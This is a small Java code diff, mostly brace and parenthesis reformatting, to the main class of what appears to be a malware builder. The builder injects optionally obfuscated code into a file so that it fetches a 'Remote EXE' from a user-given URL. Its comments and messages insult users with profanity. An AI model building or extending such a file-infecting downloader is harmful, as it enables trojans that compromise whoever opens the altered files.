@@ -19,7 +19,9 @@ public class Application {
         String obinput;
         String appinput;
 
-        if (args.length > 0) close("Don't try to use the command line shithead");
+        if (args.length > 0) {
+            close("Don't try to use the command line shithead");
+        }
 
         /* STUPID FUCKING USER INPUT FOR NOOB DUMBASSES */
         url = JOptionPane.showInputDialog("Remote EXE:", "http://example.com/test.exe");
@@ -39,13 +41,15 @@ public class Application {
         obinput = UI.getComboInput(obchoices, "Obfuscation", "Would you like to obfuscate injected code?");
         obfuscate = obinput != null && !obinput.equals(obchoices[1]);
 
-        if ((file == null) || (url == null) || (appinput == null) || (obinput == null)) {
+        if (file == null || url == null || appinput == null || obinput == null) {
             close("Missing input. Please fill in all fields appropriately.");
         }
         Injector inf = new Injector(file, url, mname);
         inf.load();
         inf.inject();
-        if (obfuscate) inf.obfuscate();
+        if (obfuscate) {
+            inf.obfuscate();
+        }
         inf.save();
         close("Process Completed!");
     }
